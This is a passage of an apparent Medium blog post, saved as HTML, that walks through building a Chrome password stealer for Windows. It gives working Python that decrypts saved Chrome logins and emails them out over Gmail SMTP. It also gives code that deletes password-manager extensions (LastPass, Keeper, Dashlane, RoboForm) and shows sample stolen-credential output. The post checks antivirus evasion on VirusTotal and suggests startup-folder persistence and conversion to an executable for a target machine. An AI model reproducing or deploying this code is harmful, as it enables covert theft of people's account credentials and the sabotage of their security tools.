+                        <blockquote class="it iu iv"><p id="d11c"
+                                                        class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                                                        data-selectable-paragraph="">Be sure to change <code
+                                class="jv km kn kd b">FROM</code> <code class="jv km kn kd b">PASSWORD</code> <code
+                                class="jv km kn kd b">TO</code> to your desired values</p></blockquote>
+                        <h1 id="60f9" class="ko kc bm bc bb fv kp kq kr ks kt ku kv kw kx ky kz"
+                            data-selectable-paragraph="">Now that we have our basic setup out of the way, we can get
+                            started</h1>
+                        <p id="cfab" class="iw ix bm bc iz b ja la jc lb je lc jg ld ji le jk"
+                           data-selectable-paragraph="">we begin by creating two functions <em class="iy">getPass() and
+                            sendEmail()</em></p>
+                        <pre class="jl jm jn jo jp dj ez ka"><span id="38f3" class="kb kc bm bc kd b dn ke kf l kg"
+                                                                   data-selectable-paragraph="">def getPass():<br>    pass</span><span
+                                id="da34" class="kb kc bm bc kd b dn kh ki kj kk kl kf l kg"
+                                data-selectable-paragraph="">def sendEmail():<br>    pass </span></pre>
+                        <p id="5f4a" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">We will base our get pass functions from @darkarp</p>
+                        <div class="lf lg lh li lj lk"><a
+                                href="https://github.com/darkarp/chrome-password-hacking/blob/master/create_server.py?source=post_page---------------------------#L145">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">darkarp/chrome-password-hacking</div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">You can't perform that action at this time.
+                                                You signed in with another tab or window. You signed out in another tab
+                                                or…
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir">github.com</div>
+                                        </h4>
+                                    </div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <p id="43b8" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">Using <code class="jv km kn kd b">sqlite3</code> and <code
+                                class="jv km kn kd b">win32crypt.CryptUnprotectData</code> to select user data from the
+                            database. if you are wondering why to is so easy, you can <a
+                                    href="https://bugs.chromium.org/p/chromium/issues/detail?id=678171"
+                                    class="ci ce lt lu lv lw"><em class="iy">read this</em></a><em class="iy">, </em>the
+                            inner workings of this function be <a
+                                    href="https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata"
+                                    class="ci ce lt lu lv lw"><em class="iy">read here</em></a><em class="iy">.</em></p>
+                        <p id="1375" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">We modify lines 145-196 to create the body of our <code
+                                class="jv km kn kd b">getPass()</code></p>
+                        <pre class="jl jm jn jo jp dj ez ka"><span id="1403" class="kb kc bm bc kd b dn ke kf l kg"
+                                                                   data-selectable-paragraph="">def getPass():<br>    # <a
+                                href="https://github.com/darkarp/chrome-password-hacking/blob/master/create_server.py"
+                                class="ci ce lt lu lv lw">https://github.com/darkarp/chrome-password-hacking/blob/master/create_server.py</a></span><span
+                                id="823b" class="kb kc bm bc kd b dn kh ki kj kk kl kf l kg"
+                                data-selectable-paragraph="">    destination = "output.txt"<br><br>    path = env + "\\Google\\Chrome\\User Data\\Default\\Login Data"<br>    path2 = env + "\\Google\\Chrome\\User Data\\Default\\Login2"<br>    path = path.strip()<br>    path2 = path2.strip()<br><br>    try:<br>        copyfile(path, path2)<br>    except:<br>        pass<br>    conn = connect(path2)<br>    cursor = conn.cursor()<br>    cursor.execute(<br>        'SELECT action_url, username_value, password_value FROM logins')<br>    if os.path.exists(destination):<br>        os.remove(destination)<br>    sites = []<br>    for raw in cursor.fetchall():<br>        # print(raw)<br>        ## raw[0] = url<br>        ## raw[1] = login<br>        ## raw[2] = binary<br>        try:<br>            if raw[0] not in sites:<br>                # print(format(win32crypt.CryptUnprotectData(raw[2])[1]))<br>                if os.path.exists(destination):<br>                    with open(destination, "a") as password:<br>                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +<br>                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')<br>                else:<br>                    with open(destination, "a") as password:<br>                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +<br>                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')<br>                sites.append(raw[0])<br>        except:<br>            continue<br>    conn.close()<br>    return 0</span></pre>
+                        <p id="75fd" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">Next from <a
+                                href="https://stackoverflow.com/questions/3362600/how-to-send-email-attachments"
+                                class="ci ce lt lu lv lw"><em class="iy">stackoverflow.com</em></a><em class="iy"> we
+                            figure out how to send an email with attachments</em></p>
+                        <div class="lf lg lh li lj lk"><a
+                                href="https://stackoverflow.com/questions/3362600/how-to-send-email-attachments?source=post_page---------------------------">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">How to send email attachments?</div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">Thanks for contributing an answer to Stack
+                                                Overflow! Please be sure to answer the question. Provide details and
+                                                share…
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir">stackoverflow.com</div>
+                                        </h4>
+                                    </div>
+                                </div>
+                                <div class="lx l">
+                                    <div class="ly l lz ma mb lx mc md me"></div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <h1 id="d91c" class="ko kc bm bc bb fv kp kq kr ks kt ku kv kw kx ky kz"
+                            data-selectable-paragraph="">The code I ended up with is:</h1>
+                        <pre class="jl jm jn jo jp dj ez ka"><span id="52f5" class="kb kc bm bc kd b dn ke kf l kg"
+                                                                   data-selectable-paragraph="">def sendEmail():<br>    # https://stackoverflow.com/questions/3362600/how-to-send-email-attachments<br>    msg = MIMEMultipart()<br>    msg['From'] = FROM<br>    msg['To'] = TO<br>    msg['Date'] = formatdate(localtime=True)<br>    msg['Subject'] = SUBJECT<br>    msg.attach(MIMEText(MESSAGE))<br><br>    part = MIMEBase('application', "octet-stream")<br>    with open('output.txt', 'rb') as file:<br>        part.set_payload(file.read())<br>    encoders.encode_base64(part)<br>    part.add_header('Content-Disposition',<br>                    'attachment; filename="{}"'.format(op.basename('output.txt')))  # name(s) of attachment(s)<br>    msg.attach(part)<br><br>    smtp = smtplib.SMTP('smtp.gmail.com', 587)<br>    smtp.starttls()<br>    smtp.login(FROM, PASSWORD)<br>    smtp.sendmail(FROM, TO, msg.as_string())<br>    smtp.quit()<br><br>    print('successfully sent the mail')</span></pre>
+                        <h1 id="1250" class="ko kc bm bc bb fv kp kq kr ks kt ku kv kw kx ky kz"
+                            data-selectable-paragraph="">Finally we call our two <strong class="co">functions</strong>
+                        </h1>
+                        <pre class="jl jm jn jo jp dj ez ka"><span id="da37" class="kb kc bm bc kd b dn ke kf l kg"
+                                                                   data-selectable-paragraph="">getPass()<br><br>sendEmail()</span></pre>
+                        <blockquote class="it iu iv"><p id="efdc"
+                                                        class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                                                        data-selectable-paragraph="">The code works as expected</p>
+                        </blockquote>
+                        <figure class="jl jm jn jo jp en v w paragraph-image">
+                            <div class="v w mf">
+                                <div class="ju l dg jv">
+                                    <div class="mg l">
+                                        <div class="dp jr di n o js x im t jt"><img
+                                                src="./index_files/1_wLmalZxjrqt3ukX4vfneXA.jpeg"
+                                                class="di n o js x jx jy" width="696" height="382"></div>
+                                        <img class="nu nv di n o js x jz" width="696" height="382"
+                                             src="./index_files/1_wLmalZxjrqt3ukX4vfneXA(1).jpeg">
+                                        <noscript><img
+                                                src=""
+                                                class="di n o js x" width="696" height="382"/></noscript>
+                                    </div>
+                                </div>
+                            </div>
+                        </figure>
+                        <blockquote class="it iu iv"><p id="a130"
+                                                        class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                                                        data-selectable-paragraph=""><em class="bc">Website: </em><a
+                                href="https://www.facebook.com/login/device-based/regular/login/"
+                                class="ci ce lt lu lv lw"><em class="bc">https://www.facebook.com/login/device-based/regular/login/</em></a><em
+                                class="bc"><br>User/email: </em><a href="mailto:email@live.ca"
+                                                                   class="ci ce lt lu lv lw"><em class="bc">email@live.ca</em></a><em
+                                class="bc"><br>Password: b’password’</em></p>
+                            <p id="1cc8" class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                               data-selectable-paragraph=""><em class="bc">Website: </em><a
+                                    href="https://www.investopedia.com/accounts/login.aspx"
+                                    class="ci ce lt lu lv lw"><em class="bc">https://www.investopedia.com/accounts/login.aspx</em></a><em
+                                    class="bc"><br>User/email: </em><a href="mailto:email@gmail.com"
+                                                                       class="ci ce lt lu lv lw"><em class="bc">email@gmail.com</em></a><em
+                                    class="bc"><br>Password: b’password’</em></p>
+                            <p id="f049" class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                               data-selectable-paragraph=""><em class="bc">Website: </em><a
+                                    href="https://portal.aws.amazon.com/billing/signup" class="ci ce lt lu lv lw"><em
+                                    class="bc">https://portal.aws.amazon.com/billing/signup</em></a><em class="bc"><br>User/email:
+                                alik604<br>Password: b’password’</em></p></blockquote>
+                        <pre class="jl jm jn jo jp dj ez ka"><span id="4bae" class="kb kc bm bc kd b dn ke kf l kg"
+                                                                   data-selectable-paragraph="">Website: <a
+                                href="https://portal.aws.amazon.com/billing/signup" class="ci ce lt lu lv lw">https://portal.aws.amazon.com/billing/signup</a><br>User/email: alik604<br>Password: b'password'</span></pre>
+                        <h1 id="379b" class="ko kc bm bc bb fv kp kq kr ks kt ku kv kw kx ky kz"
+                            data-selectable-paragraph="">Now let’s attempt to do above and beyond.</h1>
+                        <p id="1918" class="iw ix bm bc iz b ja la jc lb je lc jg ld ji le jk"
+                           data-selectable-paragraph="">Not all people will click the <em class="iy">‘save
+                            password’ </em>in chrome, perhaps they have a password manager … lets deal with that</p>
+                        <p id="1406" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">In order for this to be of benefit, our code will need to run a
+                            second time in the future. Including this code is of marginal cost to use, so we might as
+                            well</p>
+                        <pre class="jl jm jn jo jp dj ez ka"><span id="cb10" class="kb kc bm bc kd b dn ke kf l kg"
+                                                                   data-selectable-paragraph="">env = os.getenv("LOCALAPPDATA")<br>path_lastpass = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\hdokiejnpimakedhajhdlcegeplioahd"<br>path_keeper = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\bfogiafebfohielmmehodmfbbebbbpei"<br>path_dasklane = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\fdjamakpfbbddfjaooikfcpapjohcfmg"<br>path_roboform = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\pnlccmojcmeohlpggmfnbbiapkmbliob"<br><br>try:<br>    pass<br>    shutil.rmtree(path_lastpass)<br>    shutil.rmtree(path_keeper)<br>    shutil.rmtree(path_dasklane)<br>    shutil.rmtree(path_roboform)<br>except:<br>    pass</span></pre>
+                        <blockquote class="it iu iv"><p id="f4b7"
+                                                        class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                                                        data-selectable-paragraph=""><em class="bc">we set
+                            our </em><strong class="iz mh">path</strong> variable to their corresponding chrome
+                            extension folders. we get the extension id with the following</p></blockquote>
+                        <div class="lf lg lh li lj lk"><a
+                                href="https://stackoverflow.com/a/8946415/5728614?source=post_page---------------------------">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">Chrome extension id - how to find it</div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">Thanks for contributing an answer to Stack
+                                                Overflow! Please be sure to answer the question. Provide details and
+                                                share…
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir">stackoverflow.com</div>
+                                        </h4>
+                                    </div>
+                                </div>
+                                <div class="lx l">
+                                    <div class="mi l lz ma mb lx mc md me"></div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <h1 id="80bd" class="ko kc bm bc bb fv kp kq kr ks kt ku kv kw kx ky kz"
+                            data-selectable-paragraph="">To run this script we would either need to have python
+                            installed on the target computer, or convert to an executable</h1>
+                        <p id="a6ae" class="iw ix bm bc iz b ja la jc lb je lc jg ld ji le jk"
+                           data-selectable-paragraph=""><a href="http://twitter.com/lpoblet" class="ci ce lt lu lv lw">@lpoblet</a>
+                            Has a detailed tutorial on creating an executable</p>
+                        <div class="lf lg lh li lj lk"><a
+                                href="">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">The knockout guide to py2exe</div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">To compile your python programs like a world
+                                                champion.
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir"></div>
+                                        </h4>
+                                    </div>
+                                </div>
+                                <div class="lx l">
+                                    <div class="mj l lz ma mb lx mc md me"></div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <blockquote class="it iu iv"><p id="1354"
+                                                        class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                                                        data-selectable-paragraph="">While on the other hand a more
+                            concise tutorial can be found on <a
+                                    href="https://stackoverflow.com/questions/41570359/how-can-i-convert-a-py-to-exe-for-python"
+                                    class="ci ce lt lu lv lw">Stackoverflow</a></p></blockquote>
+                        <h1 id="de37" class="ko kc bm bc bb fv kp kq kr ks kt ku kv kw kx ky kz"
+                            data-selectable-paragraph="">Checking if chromePasswordThieve.py evades antivirus</h1>
+                        <p id="93d5" class="iw ix bm bc iz b ja la jc lb je lc jg ld ji le jk"
+                           data-selectable-paragraph="">“VirusTotal aggregates many antivirus products and online scan
+                            engines to check for viruses that the user’s own antivirus may have missed, or to verify
+                            against any false positives.”- <a href="https://en.wikipedia.org/wiki/VirusTotal"
+                                                              class="ci ce lt lu lv lw">Wikipedia</a></p></div>
+                    <div class="ar eo">
+                        <div class="mk ml mm mn mo mp es mq et mr x">
+                            <figure class="jl jm jn jo jp en paragraph-image">
+                                <div class="ju l dg jv">
+                                    <div class="ms l">
+                                        <div class="dp jr di n o js x im t jt"><img
+                                                src="./index_files/1_pX5N09sPqgP2td3X_-aGKQ.jpeg"
+                                                class="di n o js x jx jy" width="1000" height="165"></div>
+                                        <img class="nu nv di n o js x jz" width="1000" height="165"
+                                             src="./index_files/1_pX5N09sPqgP2td3X_-aGKQ(1).jpeg">
+                                        <noscript><img
+                                                src=""
+                                                class="di n o js x" width="1000" height="165"/></noscript>
+                                    </div>
+                                </div>
+                                <figcaption class="bg dn mt mu gf dc v w mv bb dl" data-selectable-paragraph=""><a
+                                        href="https://www.virustotal.com/gui/file/9f6f4913acb8d14a13d76b9bd9157e22b8fbefbcac67369d8b75e3a71dc21b6c/detection"
+                                        class="ci ce lt lu lv lw">VirusTotal’s scan of chromePasswordThieve.py</a>
+                                </figcaption>
+                            </figure>
+                            <figure class="jl jm jn jo jp en paragraph-image">
+                                <div class="ju l dg jv">
+                                    <div class="mw l">
+                                        <div class="dp jr di n o js x im t jt"><img
+                                                src="./index_files/1_pNoodFgIqx2NeH3Nd0vmGQ.jpeg"
+                                                class="di n o js x jx jy" width="1000" height="167"></div>
+                                        <img class="nu nv di n o js x jz" width="1000" height="167"
+                                             src="./index_files/1_pNoodFgIqx2NeH3Nd0vmGQ(1).jpeg">
+                                        <noscript><img
+                                                src=""
+                                                class="di n o js x" width="1000" height="167"/></noscript>
+                                    </div>
+                                </div>
+                                <figcaption class="bg dn mt mu gf dc v w mv bb dl" data-selectable-paragraph=""><a
+                                        href="https://www.virustotal.com/gui/file/3eb94968748736665269742f44c27e93948681a2e816827b29edb14e66a0b174/detection"
+                                        class="ci ce lt lu lv lw">VirusTotal’s scan of chromePasswordThieve.exe</a>
+                                </figcaption>
+                            </figure>
+                        </div>
+                    </div>
+                    <div class="y hu x dc da db"><p id="fb7e" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                                                    data-selectable-paragraph="">The following is an example on how more
+                        openly malicious programs evade antivirus</p>
+                        <div class="lf lg lh li lj lk"><a
+                                href="https://resources.infosecinstitute.com/antivirus-evasion-tools/?source=post_page---------------------------#gref">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">Antivirus Evasion Tools [Updated 2019]</div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">Often during our penetration testing
+                                                engagements, we may have to bypass antivirus applications - especially
+                                                during the…
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir">resources.infosecinstitute.com</div>
+                                        </h4>
+                                    </div>
+                                </div>
+                                <div class="lx l">
+                                    <div class="mx l lz ma mb lx mc md me"></div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <h1 id="c858" class="ko kc bm bc bb fv kp kq kr ks kt ku kv kw kx ky kz"
+                            data-selectable-paragraph="">On a final note, let’s discuss persistence mechanisms</h1>
+                        <p id="53c1" class="iw ix bm bc iz b ja la jc lb je lc jg ld ji le jk"
+                           data-selectable-paragraph=""><a href="http://attack.mitre.org/" class="ci ce lt lu lv lw">attack.mitre.org</a>
+                            has a proper list of Persistence. Many are advanced and difficult to do due to both lack of
+                            educational resources, and complexity. examples of professional/government grade persistence
+                            would be <a href="https://attack.mitre.org/techniques/T1179/" class="ci ce lt lu lv lw">hooking</a>,
+                            and
+                            <a href="https://reverseengineering.stackexchange.com/questions/2252/what-is-dll-injection-and-how-is-it-used-for-reversing"
+                               class="ci ce lt lu lv lw">Process Injection</a>, more details on the latter may be <a
+                                    href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
+                                    class="ci ce lt lu lv lw">found here</a>.</p>
+                        <div class="lf lg lh li lj lk"><a
+                                href="https://attack.mitre.org/tactics/TA0003/?source=post_page---------------------------">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">Persistence</div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">The adversary is trying to maintain their
+                                                foothold. Persistence consists of techniques that adversaries use to
+                                                keep…
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir">attack.mitre.org</div>
+                                        </h4>
+                                    </div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <p id="b9d8" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">To make<em class="iy"> chromePasswordThieve.py </em>persistent
+                            we can use techniques such as <a href="https://attack.mitre.org/techniques/T1023/"
+                                                             class="ci ce lt lu lv lw">Shortcut Modification</a>, or
+                            placing a compatible program in the <a href="https://attack.mitre.org/techniques/T1060/"
+                                                                   class="ci ce lt lu lv lw">startup folder</a>.</p>
+                        <blockquote class="it iu iv"><p id="e6a9"
+                                                        class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                                                        data-selectable-paragraph="">To find the windows startup folder
+                            we refer to the following</p></blockquote>
+                        <div class="lf lg lh li lj lk"><a
+                                href="https://stackoverflow.com/questions/27127710/find-startup-folder-in-windows-8-using-python?source=post_page---------------------------">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">Find startup folder in windows 8 using python
+                                        </div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">I have a code that adds a batch file to the
+                                                startup folder so that it runs when the computer starts up. my code is
+                                                the…
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir">stackoverflow.com</div>
+                                        </h4>
+                                    </div>
+                                </div>
+                                <div class="lx l">
+                                    <div class="my l lz ma mb lx mc md me"></div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <p id="f4d4" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">We can easily pair the above with <a
+                                href="https://docs.python.org/3/library/shutil.html#shutil.copyfile"
+                                class="ci ce lt lu lv lw">shutil.copyfile </a>to copy our file into the startup folder.
+                            It is advisable to delete the original instance.</p>
+                        <p id="dfc8" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">More information on persistence mechanisms can be found here</p>
+                        <div class="lf lg lh li lj lk"><a
+                                href="https://www.fireeye.com/blog/threat-research/2010/07/malware-persistence-windows-registry.html?source=post_page---------------------------">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">Malware Persistence without the Windows Registry
+                                            " Malware Persistence without the Windows Registry
+                                        </div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">For an attacker to maintain a foothold inside
+                                                your network they will typically install a piece of backdoor malware on…
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir">www.fireeye.com</div>
+                                        </h4>
+                                    </div>
+                                </div>
+                                <div class="lx l">
+                                    <div class="mz l lz ma mb lx mc md me"></div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <h1 id="b9cd" class="ko kc bm bc bb fv kp kq kr ks kt ku kv kw kx ky kz"
+                            data-selectable-paragraph="">I am releasing the core code at on my Github</h1>
+                        <div class="lf lg lh li lj lk"><a
+                                href="https://github.com/alik604/cyberSecurity/tree/master/chromePasswordThieve?source=post_page---------------------------">
+                            <section class="ln v w x y ar ba z ab ac ae af ag ah ai aj ak al am an ao ap">
+                                <div class="lo ar dd eo lp lq">
+                                    <h2 class="bb fv ga bd bm">
+                                        <div class="im ll io ip lm ir">alik604/cyberSecurity</div>
+                                    </h2>
+                                    <div class="lr l">
+                                        <h3 class="bb dl dn bd bg">
+                                            <div class="im ll io ip lm ir">You can't perform that action at this time.
+                                                You signed in with another tab or window. You signed out in another tab
+                                                or…
+                                            </div>
+                                        </h3>
+                                    </div>
+                                    <div class="ls l">
+                                        <h4 class="bb dl dm bd bg">
+                                            <div class="im ll io ip lm ir">github.com</div>
+                                        </h4>
+                                    </div>
+                                </div>
+                                <div class="lx l">
+                                    <div class="na l lz ma mb lx mc md me"></div>
+                                </div>
+                            </section>
+                        </a></div>
+                        <p id="fd79" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">you can read to core for my other projects at: <a
+                                href="https://github.com/alik604/ReadMe" class="ci ce lt lu lv lw">github.com/alik604/ReadMe</a>
+                            a few on my interesting python or security projects are <a
+                                    href="https://github.com/alik604/myPyBackDoor" class="ci ce lt lu lv lw">myPyBackDoor</a>
+                            and <a href="https://github.com/alik604/Notebooks" class="ci ce lt lu lv lw">data
+                                science</a></p>
+                        <h2 id="d6c2" class="kb kc bm bc bb fv nb nc nd ne nf ng nh ni nj nk nl"
+                            data-selectable-paragraph="">About me:</h2>
+                        <p id="b022" class="iw ix bm bc iz b ja la jc lb je lc jg ld ji le jk"
+                           data-selectable-paragraph="">3rd-year Cognitive science marjor, VP of Cognitive Science
+                            Student Society. Interested in Machine learning, Computational Data science, and Finance.
+                            Research Interests are Applications of Quantitative Analytics in Finance and Human
+                            behavior.</p></div>
+                </section>
+            </div>
+        </article>
+        <div class="dp dq dr m ds dt du dv dw e" data-test-id="post-sidebar"></div>
+        <div>
+            <div class="em en ar dd eo">
+                <div class="ar eo">
+                    <div class="ep eq er es et eu x">
+
+                        <div class="fe ff fg fh l u">
+                            <div class="fi fj l dg"><span class="l fk au fl"><div class="l di fm fn"><a
+                                    href=""><img
+                                    alt="Ali Pardhan" src="./index_files/0_dHRVY6xPltlmgNQG(1)" class="l cv fo fp"
+                                    width="80" height="80"></a></div><span class="l"><div class="fq l fr"><p
+                                    class="bb dl dm bd bg fs ft">Written by</p></div><div class="fq fu ar fr"><div
+                                    class="x ar as fc"><h2 class="bb fv fw fx bm"><a
+                                    class="ci cj ck cl cm cn co cp cq bs cr cs cf ct bt cu"
+                                    href="">Khizr Ali Pardhan</a></h2><div
+                                    class="l g"></div></div></div></span></span>
+                                <div class="fq fy l fr az">
+                                    <div class="fz l"><h4 class="bb dl ga gb bg"></h4></div>
+                                    <div class="aw gc az"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+
+</html>
